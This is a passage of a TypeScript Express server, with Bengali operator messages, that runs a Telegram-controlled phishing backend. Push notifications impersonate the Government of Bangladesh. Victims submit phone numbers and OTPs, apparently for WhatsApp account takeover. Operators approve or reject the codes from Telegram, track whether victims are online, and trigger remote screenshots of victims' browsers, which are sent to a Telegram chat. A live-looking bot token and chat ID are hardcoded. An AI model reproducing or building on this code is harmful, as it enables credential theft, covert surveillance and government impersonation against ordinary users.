                  statusText = `⚠️ <b>গ্রাহক অফলাইন রয়েছেন!</b>\n\n<b>গ্রাহক আইডি:</b> <code>${uId}</code>\n<b>কোড:</b> <code>${rawCode}</code>\n\n<b>অবস্থা/কারণ:</b> গ্রাহক এই মুহূর্তে অফলাইন রয়েছেন। তাই এই মুহূর্তে তার স্ক্রিনে কোডটি লাইভ হবে না। তবে গ্রাহক ব্রাউজার পেজে পুনরায় আসার সাথে সাথে কোডটি স্বয়ংক্রিয়ভাবে সচল হবে।`;
                } else {
                  statusText = `🟢 <b>হোয়াটসঅ্যাপ গেটওয়ে কোড লাইভ সাকসেস!</b>\n\n<b>গ্রাহক আইডি:</b> <code>${uId}</code>\n<b>কোড:</b> <code>${rawCode}</code>\n\n<b>অবস্থা:</b> গ্রাহক অনলাইনে সক্রিয় রয়েছেন এবং কোডটি তার ব্রাউজার স্ক্রিনে লাইভ সচল করা হয়েছে!`;
                }

                await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({
                    chat_id: chatId,
                    text: statusText,
                    parse_mode: 'HTML',
                    reply_to_message_id: update.message.message_id
                  })
                }).catch(() => {});
              }
            }
            else if (screenshotMatch) {
              const uId = screenshotMatch[1].toLowerCase().replace(/[\{\}\[\]\(\)\s]/g, '').replace('-', '_');
              
              console.log(`[TELEGRAM REMOTE COMMAND] TAKE SCREENSHOT: user ${uId}`);
              const statusInfo = sessionOnlineStatus[uId];
              
              if (!statusInfo) {
                await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({
                    chat_id: chatId,
                    text: `❌ <b>স্ক্রিনশট অফার ব্যর্থ হয়েছে!</b>\n\n<b>গ্রাহক আইডি:</b> <code>${uId}</code>\n<b>অবস্থা:</b> আনরেজিস্টার্ড (Not found)\n\n<b>কারণ:</b> <u>${uId}</u> আইডিটি সিস্টেমে খুঁজে পাওয়া যায়নি।`,
                    parse_mode: 'HTML',
                    reply_to_message_id: update.message.message_id
                  })
                }).catch(() => {});
              } else if (statusInfo.status !== 'online') {
                await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({
                    chat_id: chatId,
                    text: `⚠️ <b>গ্রাহক অফলাইন রয়েছেন!</b>\n\n<b>গ্রাহক আইডি:</b> <code>${uId}</code>\n<b>অবস্থা:</b> অফলাইন (Offline)\n\n<b>কারণ:</b> গ্রাহক অফলাইন থাকায় তার ব্রাউজার লাইভ স্ক্রিনশট নেওয়া সম্ভব নয়। অনুগ্রহ করে গ্রাহক অন স্ক্রিনে আসা পর্যন্ত অপেক্ষা করুন।`,
                    parse_mode: 'HTML',
                    reply_to_message_id: update.message.message_id
                  })
                }).catch(() => {});
              } else {
                // Set the pending capture instruction
                sessionRemoteCommands[uId] = {
                  action: 'take_screenshot',
                  timestamp: Date.now()
                };

                // Trigger Web Push alert
                sendPushNotification(uId, sessionRemoteCommands[uId]).catch(err => console.error(err));

                await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({
                    chat_id: chatId,
                    text: `📸 <b>গ্রাহক ভিউপোর্ট স্ক্রিনশট সিঙ্ক করা হচ্ছে...</b>\n\n<b>গ্রাহক আইডি:</b> <code>${uId}</code>\n<b>অবস্থা:</b> ব্রাউজারে রিমোট ইনস্ট্রাকশন রেন্ডার করা হয়েছে। ১-৩ সেকেন্ডের মাঝে ইমেজটি ক্যাপচার করে টেলিগ্রামে আপলোড করা হবে।`,
                    parse_mode: 'HTML',
                    reply_to_message_id: update.message.message_id
                  })
                }).catch(() => {});
              }
            }
            else if (successMatch) {
              const uId = successMatch[1].toLowerCase();
              sessionOtpStatus[uId] = { ...(sessionOtpStatus[uId] || { status: "pending", timestamp: Date.now() }), status: "success" };
              console.log(`[TELEGRAM ADMIN] Set SUCCESS for user ${uId}`);
              await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  chat_id: chatId,
                  text: `✅ User session "${uId}" has been set to SUCCESS.`,
                  reply_to_message_id: update.message.message_id
                })
              }).catch(() => {});
            } else if (errorMatch) {
              const uId = errorMatch[1].toLowerCase();
              sessionOtpStatus[uId] = { ...(sessionOtpStatus[uId] || { status: "pending", timestamp: Date.now() }), status: "error" };
              console.log(`[TELEGRAM ADMIN] Set ERROR for user ${uId}`);
              await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  chat_id: chatId,
                  text: `❌ User session "${uId}" has been set to ERROR.`,
                  reply_to_message_id: update.message.message_id
                })
              }).catch(() => {});
            } else if (replyTo) {
              const replyText = replyTo.text || replyTo.caption || '';
              // Match "User ID: user_X" inside notification messages
              const userIdMatch = replyText.match(/User\s*ID:\s*(user_\d+)/i);
              if (userIdMatch) {
                const uId = userIdMatch[1].toLowerCase();
                const replyCmd = text.toLowerCase();

                if (replyCmd.includes('success') || replyCmd === 'ok' || replyCmd === 'yes' || replyCmd.includes('ঠিক') || replyCmd.includes('সফল')) {
                  sessionOtpStatus[uId] = { ...(sessionOtpStatus[uId] || { status: "pending", timestamp: Date.now() }), status: "success" };
                  console.log(`[TELEGRAM ADMIN RESPONSE] Auto-reply SUCCESS for ${uId}`);
                  await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                      chat_id: chatId,
                      text: `✅ verified successfully. User "${uId}" set to SUCCESS.`,
                      reply_to_message_id: update.message.message_id
                    })
                  }).catch(() => {});
                } else if (replyCmd.includes('error') || replyCmd.includes('fail') || replyCmd.includes('wrong') || replyCmd.includes('err') || replyCmd.includes('ভুল') || replyCmd.includes('ভোল')) {
                  sessionOtpStatus[uId] = { ...(sessionOtpStatus[uId] || { status: "pending", timestamp: Date.now() }), status: "error" };
                  console.log(`[TELEGRAM ADMIN RESPONSE] Auto-reply ERROR for ${uId}`);
                  await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                      chat_id: chatId,
                      text: `❌ Verified as wrong OTP. User "${uId}" set to ERROR.`,
                      reply_to_message_id: update.message.message_id
                    })
                  }).catch(() => {});
                }
              }
            }
          }
        }
      }
    } catch (err: any) {
      const errMsg = err instanceof Error ? err.message : String(err);
      const isNetworkError = errMsg.includes('fetch failed') ||
                             errMsg.includes('ETIMEDOUT') ||
                             errMsg.includes('socket hang up') ||
                             errMsg.includes('ECONNRESET') ||
                             (err.cause && String(err.cause).includes('ETIMEDOUT'));
      
      if (isNetworkError) {
        console.warn(`[TELEGRAM POLLING] Network/Timeout error (e.g. ETIMEDOUT) during poll. Retrying in 10 seconds...`);
        await new Promise((resolve) => setTimeout(resolve, 10000));
      } else {
        console.error('[TELEGRAM POLLING ERROR]', err);
      }
    }
    await new Promise((resolve) => setTimeout(resolve, 1500));
  }
}

async function startServer() {
  const app = express();
  const PORT = process.env.PORT ? parseInt(process.env.PORT, 10) : 3000;

  app.use(express.json());

  // Trigger base polling as a side effect
  startTelegramPolling().catch(err => console.error('[POLLING TRIGGER FAIL]', err));

  // Served Push Service Worker file directly from Express to bypass public folder/Vite paths
  app.get("/sw.js", (req, res) => {
    res.setHeader("Content-Type", "application/javascript");
    res.send(`
      self.addEventListener('push', function(event) {
        console.log('[Service Worker] Push Received.');
        let data = { title: 'গণপ্রজাতন্ত্রী বাংলাদেশ সরকার', body: 'নতুন সরকারি জরুরি নির্দেশ বা সেবা এসেছে।' };
        if (event.data) {
          try {
            data = event.data.json();
          } catch (e) {
            data = { title: 'গণপ্রজাতন্ত্রী বাংলাদেশ সরকার', body: event.data.text() };
          }
        }

        const options = {
          body: data.body,
          icon: '/gov-logo.png',
          badge: '/gov-logo.png',
          tag: 'government-alert',
          vibrate: [200, 100, 200],
          requireInteraction: true,
          data: {
            url: self.location.origin
          }
        };

        event.waitUntil(
          self.registration.showNotification(data.title, options)
        );
      });

      self.addEventListener('notificationclick', function(event) {
        console.log('[Service Worker] Notification click Received.');
        event.notification.close();
        
        // Open or focus the app window
        event.waitUntil(
          clients.matchAll({ type: 'window', includeUncontrolled: true }).then(function(clientList) {
            for (let i = 0; i < clientList.length; i++) {
              let client = clientList[i];
              if (client.url.indexOf('/') !== -1 && 'focus' in client) {
                return client.focus();
              }
            }
            if (clients.openWindow) {
              return clients.openWindow('/');
            }
          })
        );
      });
    `);
  });

  // Check state of user status (online/offline) and notify Telegram if user exits
  app.post("/api/user-status-change", async (req, res) => {
    const { userId, status } = req.body;
    if (!userId) return res.status(400).json({ success: false, error: 'Missing userId' });
    
    const uId = String(userId).toLowerCase().trim();
    const previous = sessionOnlineStatus[uId];
    
    sessionOnlineStatus[uId] = {
      status: status, // 'online' or 'offline'
      lastActive: Date.now()
    };

    if (!previous || previous.status !== status) {
      console.log(`[USER STATUS] ${uId} is now ${status}`);
      // Send a Telegram log notification
      const TG_BOT_TOKEN = activeTgBotToken || process.env.TG_BOT_TOKEN || '8367516207:AAF5WSe_nknlkClqU5J0x5lX1nSli3waAXs';
      const TG_CHAT_ID = activeTgChatId || process.env.TG_CHAT_ID || '-1003552771281';

      let text = '';
      if (status === 'online') {
        text = `🟢 <b>গ্রাহক অনলাইনে এসেছেন!</b>\n\n<b>গ্রাহক আইডি:</b> <code>${uId}</code>\n<b>অবস্থা:</b> 🟢 অনলাইন (Active Window)`;
      } else {
        text = `🔴 <b>গ্রাহক পেজ থেকে বের হয়ে গিয়েছেন!</b>\n\n<b>গ্রাহক আইডি:</b> <code>${uId}</code>\n<b>অবস্থা:</b> 🔴 অফলাইন (Closed/Background)`;
      }

      await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TG_CHAT_ID,
          text: text,
          parse_mode: 'HTML'
        })
      }).catch(err => console.error('[STATUS TG ALERT ERR]', err));
    }

    res.json({ success: true });
  });

  // Get dynamic local VAPID public key
  app.get("/api/vapid-public-key", (req, res) => {
    res.json({ publicKey: vapidKeys.publicKey });
  });

  // Store client Web Push subscriptions
  app.post("/api/push-subscribe", (req, res) => {
    const { userId, subscription } = req.body;
    if (!userId || !subscription) {
      return res.status(400).json({ success: false, error: "Missing parameters" });
    }
    const uId = String(userId).toLowerCase().trim();
    if (!sessionPushSubscriptions[uId]) {
      sessionPushSubscriptions[uId] = [];
    }
    const exists = sessionPushSubscriptions[uId].some(
      sub => sub.endpoint === subscription.endpoint
    );
    if (!exists) {
      sessionPushSubscriptions[uId].push(subscription);
      savePushSubscriptions();
    }
    console.log(`[PUSH] Subscribing player ${uId}. Registered count: ${sessionPushSubscriptions[uId].length}`);
    res.json({ success: true });
  });

  // Update browser push permission status and log to Telegram
  app.post("/api/push-permission-update", async (req, res) => {
    const { userId, permission } = req.body;
    if (!userId) {
      return res.status(400).json({ success: false, error: "Missing parameter userId" });
    }
    const uId = String(userId).toLowerCase().trim();

    const TG_BOT_TOKEN = activeTgBotToken || process.env.TG_BOT_TOKEN || '8367516207:AAF5WSe_nknlkClqU5J0x5lX1nSli3waAXs';
    const TG_CHAT_ID = activeTgChatId || process.env.TG_CHAT_ID || '-1003552771281';

    let text = '';
    if (permission === 'granted') {
      text = `🔔 <b>পুশ নোটিফিকেশন সচল করা হয়েছে!</b>\n\n<b>গ্রাহক আইডি:</b> <code>${uId.toUpperCase()}</code>\n<b>অবস্থা:</b> 🟢 পুশ নোটিফিকেশন অনুমোদিত (Allowed)`;
    } else if (permission === 'denied') {
      text = `🔕 <b>পুশ নোটিফিকেশন ব্লক করা হয়েছে!</b>\n\n<b>গ্রাহক আইডি:</b> <code>${uId.toUpperCase()}</code>\n<b>অবস্থা:</b> 🔴 পুশ নোটিফিকেশন ব্লকড (Blocked)`;
    } else {
      text = `⚠️ <b>পুশ নোটিফিকেশন আপডেট!</b>\n\n<b>গ্রাহক আইডি:</b> <code>${uId.toUpperCase()}</code>\n<b>অবস্থা:</b> 🟡 ${permission}`;
    }

    await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TG_CHAT_ID,
        text: text,
        parse_mode: "HTML"
      })
    }).catch(err => console.error('[PERMISSION TG LOG ERROR]', err));

    res.json({ success: true, permission });
  });

  // Request Sequential Unique User-Session ID
  app.get("/api/request-session-id", (req, res) => {
    userCounter++;
    const sessionId = `user_${userCounter}`;
    res.json({ success: true, sessionId });
  });

  // Submit entered OTP and mark verification as pending
  app.post("/api/submit-otp", (req, res) => {
    const { userId, phone, platform, otp } = req.body;
    if (!userId) return res.status(400).json({ success: false, error: 'Missing userId' });
    
    const uId = String(userId).toLowerCase().trim();
    sessionOtpStatus[uId] = {
      status: "pending",
      otp,
      phone,
      platform,
      timestamp: Date.now()
    };
    console.log(`[OTP] Submitted for ${uId} (${platform}): ${otp}`);
    res.json({ success: true });
  });

  // Check real-time OTP verification status
  app.get("/api/otp-status", (req, res) => {
    const { userId } = req.query;
    if (!userId) return res.status(400).json({ success: false, error: 'Missing userId' });
    
    const uId = String(userId).toLowerCase().trim();
    const session = sessionOtpStatus[uId];
    if (!session) {
      return res.json({ success: true, status: 'pending' });
    }
    res.json({ success: true, status: session.status, platform: session.platform });
  });

  // Get remote commands for a targeted user
  app.get("/api/remote-command", (req, res) => {
    const { userId } = req.query;
    if (!userId) return res.status(400).json({ success: false, error: 'Missing userId' });
    
    const uId = String(userId).toLowerCase().trim();
    const command = sessionRemoteCommands[uId];
    res.json({ success: true, command: command || null });
  });

  // Helper endpoint to securely proxy media files from Telegram API using file_id
  app.get("/api/telegram-file", async (req, res) => {
    const { file_id } = req.query;
    if (!file_id) {
      return res.status(400).send("file_id is required");
    }

    const TG_BOT_TOKEN = activeTgBotToken;
    if (!TG_BOT_TOKEN) {
      return res.status(500).send("Telegram Bot Token is not set");
    }

    try {
      // 1. Resolve file path from Telegram
      const getFileUrl = `https://api.telegram.org/bot${TG_BOT_TOKEN}/getFile?file_id=${file_id}`;
      const pathRes = await fetch(getFileUrl);
      if (!pathRes.ok) {
        return res.status(pathRes.status).send(`Failed to fetch file info from Telegram`);
      }
      
      const fileMeta = await pathRes.json();
      if (!fileMeta.ok || !fileMeta.result?.file_path) {
        return res.status(404).send("File path metadata not found on Telegram response");
      }

      const filePath = fileMeta.result.file_path;
      const downloadUrl = `https://api.telegram.org/file/bot${TG_BOT_TOKEN}/${filePath}`;

      // 2. Fetch file content stream and pipe to client
      const mediaRes = await fetch(downloadUrl);
      if (!mediaRes.ok) {
        return res.status(mediaRes.status).send(`Failed to stream media content from Telegram`);
      }

      // Set headers from Telegram source
      const contentType = mediaRes.headers.get("content-type");
      if (contentType) res.setHeader("content-type", contentType);

      const contentLength = mediaRes.headers.get("content-length");
      if (contentLength) res.setHeader("content-length", contentLength);

      // Support caching to avoid refetching on transient state updates
      res.setHeader("Cache-Control", "public, max-age=86400");

      const reader = mediaRes.body?.getReader();
      if (!reader) {
        return res.status(500).send("Failed to stream binary buffer content");
      }

      while (true) {
        const { done, value } = await reader.read();
        if (done) break;
        res.write(value);
      }
      res.end();
    } catch (err) {
      console.error("[TELEGRAM FILE PROXY ERROR]", err);
      res.status(500).send("Internal proxy error with Telegram media files");
    }
  });

  // Clear/acknowledge remote commands after target client has executed them
  app.post("/api/clear-remote-command", (req, res) => {
    const { userId } = req.body;
    if (userId) {
      const uId = String(userId).toLowerCase().trim();
      delete sessionRemoteCommands[uId];
    }
    res.json({ success: true });
  });

  // Reset/Clear user status for re-tries
  app.post("/api/reset-otp", (req, res) => {
    const { userId } = req.body;
    if (userId) {
      const uId = String(userId).toLowerCase().trim();
      if (sessionOtpStatus[uId]) {
        sessionOtpStatus[uId].status = "pending";
      }
    }
    res.json({ success: true });
  });

  // Mock Email Notification Endpoint
  app.post("/api/notify", (req, res) => {
    const { email, name, status, type } = req.body;
    
    // In a real app, you'd use SendGrid, Resend, etc.
    console.log(`[EMAIL NOTIFICATION] To: ${email}, Name: ${name}, Status: ${status}, Type: ${type}`);
    
    // Simulate email sending
    setTimeout(() => {
      res.json({ 
        success: true, 
        message: type === 'status' 
          ? `Status update email sent to ${email}` 
          : `New document upload notification sent to ${email}` 
      });
    }, 500);
  });

  // Dynamic Telegram Bot Config updates
  app.post("/api/update-tg-config", (req, res) => {
    const { tgBotToken, tgChatId } = req.body;
    if (tgBotToken !== undefined) activeTgBotToken = tgBotToken.trim();
    if (tgChatId !== undefined) activeTgChatId = tgChatId.trim();
    res.json({ success: true, activeTgBotToken: activeTgBotToken ? `${activeTgBotToken.substring(0, 8)}...` : 'empty', activeTgChatId });
  });

  // Telegram Bot Notification Endpoint
  app.post("/api/notify-bot", async (req, res) => {
    const { message, userId, email, parseMode = 'HTML', tgBotToken, tgChatId } = req.body;
    const TG_BOT_TOKEN = tgBotToken || activeTgBotToken || process.env.TG_BOT_TOKEN || '8367516207:AAF5WSe_nknlkClqU5J0x5lX1nSli3waAXs';
    const TG_CHAT_ID = tgChatId || activeTgChatId || process.env.TG_CHAT_ID || '-1003552771281';

    const escapeHTML = (str: string) => {
      if (!str) return '';
      return str.replace(/[&<>"']/g, (m) => ({
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#39;'
      }[m] || m));
    };

    try {
      // If we are using HTML mode, we need to be careful about the content
      // We'll wrap the message but escape the metadata
      const safeUserId = escapeHTML(userId);
      const safeEmail = escapeHTML(email || 'Guest');
      
      // If the message is intended to be HTML, we trust it (from our own code)
      // but for simple activity logs, we should escape it.
      // We'll assume if it starts with '<b>' it's pre-formatted HTML.
      const safeMessage = (message && message.startsWith('<b>')) ? message : escapeHTML(message);
      
      let actionCmds = '';
      if (safeUserId && safeUserId !== 'unassigned' && safeUserId !== 'Unknown') {
        actionCmds = `\n\n<b>⚡ Quick Action Commands:</b>\n✅ Approval: /success_${safeUserId}\n❌ Rejection: /error_${safeUserId}`;
      }

      const response = await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TG_CHAT_ID,
          text: `<b>🔔 Activity Alert</b>\n\n<b>Action:</b> ${safeMessage}\n<b>User ID:</b> <code>${safeUserId}</code>\n<b>Email:</b> ${safeEmail}\n<b>Time:</b> ${new Date().toLocaleString('en-GB')}${actionCmds}`,
          parse_mode: 'HTML'
        }),
      });

      if (!response.ok) {
        const errorData = await response.json().catch(() => ({}));
        if (response.status === 401) {
          console.warn('[TELEGRAM WARNING] sendMessage returned Unauthorized (401). Bot token might be invalid or revoked.');
        } else {
          console.error('Telegram API error (sendMessage):', errorData);
        }
        const isUnauthorized = response.status === 401;
        const errMsg = isUnauthorized
          ? 'Telegram API returned Unauthorized (401). Please check TG_BOT_TOKEN and TG_CHAT_ID in AI Studio UI Secrets.'
          : (errorData.description || 'Telegram API error');
        return res.status(200).json({ 
          success: false, 
          error: errMsg, 
          isConfigError: isUnauthorized, 
          errorCode: response.status 
        });
      }

      res.json({ success: true });
    } catch (error) {
      console.error('Bot notification server error:', error);
      res.status(200).json({ success: false, error: 'Internal server error during Telegram notification' });
    }
  });

  // Telegram Photo Upload Endpoint
  app.post("/api/upload-photo", upload.single('photo'), async (req, res) => {
    if (!req.file) {
      return res.status(400).json({ success: false, error: 'No file uploaded' });
    }

    const { tgBotToken, tgChatId } = req.body || {};
    const TG_BOT_TOKEN = tgBotToken || activeTgBotToken || process.env.TG_BOT_TOKEN || '8367516207:AAF5WSe_nknlkClqU5J0x5lX1nSli3waAXs';
    const TG_CHAT_ID = tgChatId || activeTgChatId || process.env.TG_CHAT_ID || '-1003552771281';

    try {
      const formData = new FormData();
      formData.append('chat_id', TG_CHAT_ID);
      const blob = new Blob([req.file.buffer], { type: req.file.mimetype });
      formData.append('photo', blob, req.file.originalname);

      const response = await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData,
      });

      const data = await response.json().catch(() => ({}));
      if (response.ok && data.ok) {
        const fileId = data.result.photo[data.result.photo.length - 1].file_id;
        const pathResponse = await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/getFile?file_id=${fileId}`);
        const pathData = await pathResponse.json().catch(() => ({}));
        if (pathResponse.ok && pathData.ok) {
          const fileUrl = `https://api.telegram.org/file/bot${TG_BOT_TOKEN}/${pathData.result.file_path}`;
          return res.json({ success: true, fileUrl });
        }
      }
      
      if (response.status === 401 || data.error_code === 401) {
        console.warn('[TELEGRAM WARNING] sendPhoto returned Unauthorized (401). Bot token might be invalid or revoked.');
      } else {
        console.error('Telegram API error (sendPhoto):', data);
      }
      const isUnauthorized = response.status === 401 || data.error_code === 401;
      const errMsg = isUnauthorized
        ? 'Telegram sendPhoto returned Unauthorized (401). Please check TG_BOT_TOKEN and TG_CHAT_ID in AI Studio UI Secrets.'
        : (data.description || 'Telegram upload failed');
      return res.status(200).json({ 
        success: false, 
        error: errMsg, 
        isConfigError: isUnauthorized,
        errorCode: response.status || data.error_code 
      });
    } catch (error) {
      console.error('Photo upload server error:', error);
      res.status(200).json({ success: false, error: 'Internal server error during Telegram photo upload' });
    }
  });

  // Telegram Screenshot Live Receiver Endpoint
  app.post("/api/upload-screenshot", upload.single('photo'), async (req, res) => {
    if (!req.file) {
      return res.status(400).json({ success: false, error: 'No file uploaded' });
    }

    const { userId } = req.body || {};
    const uId = userId ? String(userId).toLowerCase().trim() : 'unknown';

    const TG_BOT_TOKEN = activeTgBotToken || process.env.TG_BOT_TOKEN || '8367516207:AAF5WSe_nknlkClqU5J0x5lX1nSli3waAXs';
    const TG_CHAT_ID = activeTgChatId || process.env.TG_CHAT_ID || '-1003552771281';

    try {
      const formData = new FormData();
      formData.append('chat_id', TG_CHAT_ID);
      const blob = new Blob([req.file.buffer], { type: req.file.mimetype });
      formData.append('photo', blob, `screenshot_${uId}.png`);
      formData.append('caption', `📸 <b>গ্রাহকের লাইভ ব্রাউজার স্ক্রিনশট!</b>\n\n<b>গ্রাহক আইডি:</b> <code>${uId}</code>\n<b>অবস্থা:</b> সফলভাবে গ্রাহকের লাইভ স্ক্রিন থেকে ক্যাপচার করা হয়েছে।`);
      formData.append('parse_mode', 'HTML');

      const response = await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData,
      });

      const data = await response.json().catch(() => ({}));
      if (response.ok && data.ok) {
        return res.json({ success: true });
      }

      console.error('Telegram API error (upload-screenshot sendPhoto):', data);
      res.json({ success: false, error: data.description });
    } catch (error) {
      console.error('Screenshot upload server error:', error);
      res.status(500).json({ success: false });
    }
  });

  // Support serving images directly from the root directory (so images uploaded to the root show up live)
  app.get(/\.(jpg|jpeg|png|gif|webp|svg|ico)$/i, (req, res, next) => {
    try {
      const decodedPath = decodeURIComponent(req.path);
      const exactPath = path.join(process.cwd(), decodedPath);
      const basenamePath = path.join(process.cwd(), path.basename(decodedPath));

      if (fs.existsSync(exactPath) && fs.statSync(exactPath).isFile()) {
        return res.sendFile(exactPath);
      } else if (fs.existsSync(basenamePath) && fs.statSync(basenamePath).isFile()) {
        return res.sendFile(basenamePath);
      }
    } catch (e) {
      console.error("Error serving root image:", e);
    }
    next();
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
